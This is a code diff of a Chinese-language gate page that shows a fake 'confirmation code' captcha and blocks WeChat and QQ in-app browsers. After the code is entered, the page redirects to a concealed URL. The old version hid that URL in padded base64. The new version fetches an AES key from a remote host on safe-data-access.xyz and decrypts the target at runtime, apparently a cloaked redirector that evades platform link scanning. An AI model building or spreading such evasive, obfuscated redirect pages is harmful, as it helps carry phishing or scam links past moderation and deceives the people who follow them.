@@ -2,220 +2,110 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>加载中</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>加载中……</title>
+  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
   <style>
-    body {
-      margin: 0;
-      background-color: #f2f4f8;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-      color: #333;
-      text-align: center;
-      padding: 100px 20px;
-    }
-
-    .hidden { display: none; }
-
-    .card {
-      background-color: #fff;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 40px 30px;
-    }
-
-    .lock-icon {
-      font-size: 64px;
-      color: #e74c3c;
-      margin-bottom: 20px;
-    }
-
-    .message {
-      font-size: 18px;
-      margin-bottom: 25px;
-    }
-
-    .code-area {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-
-    canvas {
-      border-radius: 5px;
-      background-color: #eee;
-      cursor: pointer;
-    }
-
-    .refresh-btn {
-      background-color: #e0e0e0;
-      color: #333;
-      border: none;
-      padding: 6px 10px;
-      font-size: 14px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    .refresh-btn:hover {
-      background-color: #ccc;
-    }
-
-    input[type="text"] {
-      padding: 12px;
-      font-size: 16px;
-      width: 180px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      margin-bottom: 20px;
-      text-align: center;
-      transition: all 0.2s;
-    }
-
-    button {
-      padding: 12px 25px;
-      font-size: 16px;
-      background-color: #3498db;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    button:hover {
-      background-color: #2980b9;
-    }
-
-    #error {
-      color: #e74c3c;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-
-    @keyframes shake {
-      0% { transform: translateX(0); }
-      25% { transform: translateX(-5px); }
-      50% { transform: translateX(5px); }
-      75% { transform: translateX(-5px); }
-      100% { transform: translateX(0); }
-    }
-
-    .shake {
-      animation: shake 0.3s ease;
-    }
+    body{margin:0;background:#f2f4f8;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;color:#333;text-align:center;padding:100px 20px;}
+    .hidden{display:none;}
+    .card{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:400px;margin:0 auto;padding:40px 30px;}
+    .lock-icon{font-size:64px;color:#e74c3c;margin-bottom:20px;}
+    .message{font-size:18px;margin-bottom:25px;}
+    .code-area{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:20px;}
+    canvas{border-radius:5px;background:#eee;cursor:pointer;}
+    .refresh-btn{background:#e0e0e0;color:#333;border:none;padding:6px 10px;font-size:14px;border-radius:5px;cursor:pointer;}
+    .refresh-btn:hover{background:#ccc;}
+    input[type=text]{padding:12px;font-size:16px;width:180px;border:1px solid #ccc;border-radius:5px;margin-bottom:20px;text-align:center;}
+    button{padding:12px 25px;font-size:16px;background:#3498db;color:#fff;border:none;border-radius:5px;cursor:pointer;}
+    button:hover{background:#2980b9;}
+    #error{color:#e74c3c;margin-top:10px;font-size:14px;}
+    @keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
+    .shake{animation:shake .3s ease;}
   </style>
 </head>
 <body>
 
-  <div id="wechat-warning" class="card hidden">
-    <div class="lock-icon">🔒</div>
-    <div class="message">请使用手机浏览器访问本页面</div>
+<div id="wechat-warning" class="card hidden">
+  <div class="lock-icon">🔒</div>
+  <div class="message">请使用手机浏览器访问本页面</div>
+</div>
+
+<div id="verify-box" class="card hidden">
+  <div class="lock-icon">🔒</div>
+  <div class="message">请输入确认码继续</div>
+  <div class="code-area">
+    <canvas id="captchaCanvas" width="120" height="40" title="更换确认码"></canvas>
+    <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
   </div>
+  <input type="text" id="code-input" maxlength="4" placeholder="确认码">
+  <br>
+  <button onclick="checkCode()">确定</button>
+  <div id="error"></div>
+</div>
 
-  <div id="verify-box" class="card hidden">
-    <div class="lock-icon">🔒</div>
-    <div class="message">请输入下面确认码继续</div>
-    <div class="code-area">
-      <canvas id="captchaCanvas" width="120" height="40" title="更换确认码"></canvas>
-      <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
-    </div>
-    <input type="text" id="code-input" maxlength="4" placeholder="确认码">
-    <br>
-    <button onclick="checkCode()">确定</button>
-    <div id="error"></div>
-  </div>
+<script>
+/* ---------- 配置 ---------- */
+const keyApi = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";   // ← 短配置
+const encryptedStr = "U2FsdGVkX19CUfvdcCRefc9qfVP9fm55yAo3ZxcJgkuwETAQxCnCeAHTJMtJb8piuQliPnsj8YRkE5DYUmKrDA=="; // ← 长配置
 
-  <script>
-    function isWX() {
-      return /micromessenger/i.test(navigator.userAgent);
-    }
+/* ---------- 提示---------- */
+function isWX(){return /micromessenger|qq\//i.test(navigator.userAgent);}
 
-    let code = "";
+/* ---------- 生成---------- */
+let code="";
+function generateCode(){return (Math.floor(1000+Math.random()*9000)).toString();}
+function drawCaptcha(){
+  const c=document.getElementById("captchaCanvas"),ctx=c.getContext("2d");
+  code=generateCode();
+  ctx.clearRect(0,0,c.width,c.height);
+  ctx.fillStyle="#fff";ctx.fillRect(0,0,c.width,c.height);
 
-    function generateCode() {
-      return Math.floor(1000 + Math.random() * 9000).toString();
-    }
+  /* 文字 */
+  for(let i=0;i<code.length;i++){
+    const fs=22+Math.random()*6;ctx.font=`${fs}px Arial`;
+    ctx.fillStyle=`rgb(${Math.random()*120},${Math.random()*120},${Math.random()*120})`;
+    ctx.fillText(code[i],10+i*25,28+Math.random()*5);
+  }
+  /* 干扰4 条 */
+  for(let i=0;i<4;i++){
+    ctx.strokeStyle=`rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
+    ctx.beginPath();
+    ctx.moveTo(Math.random()*c.width,Math.random()*c.height);
+    ctx.lineTo(Math.random()*c.width,Math.random()*c.height);
+    ctx.stroke();
+  }
+  /* 噪点 20 个 */
+  for(let i=0;i<20;i++){
+    ctx.fillStyle=`rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
+    ctx.beginPath();
+    ctx.arc(Math.random()*c.width,Math.random()*c.height,1+Math.random()*1.5,0,2*Math.PI);
+    ctx.fill();
+  }
+}
+document.getElementById("captchaCanvas").addEventListener("click",drawCaptcha);
 
-    function drawCaptcha() {
-      const canvas = document.getElementById("captchaCanvas");
-      const ctx = canvas.getContext("2d");
-      code = generateCode();
+/* ---------- 点击确认 ---------- */
+async function checkCode(){
+  const val=document.getElementById("code-input").value.trim();
+  if(val!==code){
+    showErr("确认码错误，请重试",true);return;
+  }
+  try{
+    const key=await fetch(keyApi+"?menu=btn&v=202406").then(r=>r.text());
+    const url=CryptoJS.AES.decrypt(encryptedStr,key).toString(CryptoJS.enc.Utf8);
+    if(url.startsWith("http")){location.href=url;}else{showErr("访问失败，请稍后再试");}
+  }catch(e){showErr("网络错误，请稍后再试");}
+}
+function showErr(msg,shake){
+  const box=document.getElementById("error");box.innerText=msg;
+  if(shake){const inp=document.getElementById("code-input");inp.classList.add("shake");drawCaptcha();setTimeout(()=>inp.classList.remove("shake"),300);}
+}
 
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#fff";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-      for (let i = 0; i < code.length; i++) {
-        const fontSize = 22 + Math.random() * 6;
-        ctx.font = `${fontSize}px Arial`;
-        ctx.fillStyle = `rgb(${Math.random()*120}, ${Math.random()*120}, ${Math.random()*120})`;
-        const x = 10 + i * 25;
-        const y = 28 + Math.random() * 5;
-        ctx.fillText(code[i], x, y);
-      }
-
-      for (let i = 0; i < 4; i++) {
-        ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
-        ctx.beginPath();
-        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-        ctx.stroke();
-      }
-
-      for (let i = 0; i < 20; i++) {
-        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
-        ctx.beginPath();
-        ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1 + Math.random()*1.5, 0, 2 * Math.PI);
-        ctx.fill();
-      }
-    }
-
-    const cfgData = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA==";
-    const prefix = 5, suffix = 4;
-
-    function decodeData(str) {
-      try {
-        const raw = atob(str);
-        return raw.slice(prefix, raw.length - suffix);
-      } catch {
-        return null;
-      }
-    }
-
-    function checkCode() {
-      const val = document.getElementById("code-input").value.trim();
-      if (val === code) {
-        document.getElementById("error").innerText = "";
-        const cdnPath = decodeData(cfgData);
-        if (cdnPath) {
-          location.assign(cdnPath);
-        } else {
-          document.getElementById("error").innerText = "载入失败，请稍后重试";
-        }
-      } else {
-        document.getElementById("error").innerText = "确认码错误，请重试";
-        const input = document.getElementById("code-input");
-        input.classList.add("shake");
-        drawCaptcha();
-        setTimeout(() => input.classList.remove("shake"), 300);
-      }
-    }
-
-    window.onload = () => {
-      if (isWX()) {
-        document.getElementById("wechat-warning").classList.remove("hidden");
-      } else {
-        document.getElementById("verify-box").classList.remove("hidden");
-        drawCaptcha();
-      }
-    };
-
-    document.getElementById("captchaCanvas").addEventListener("click", drawCaptcha);
-  </script>
+/* ---------- 初始化 ---------- */
+window.onload=()=>{
+  if(isWX()) document.getElementById("wechat-warning").classList.remove("hidden");
+  else {document.getElementById("verify-box").classList.remove("hidden");drawCaptcha();}
+};
+</script>
 </body>
 </html>
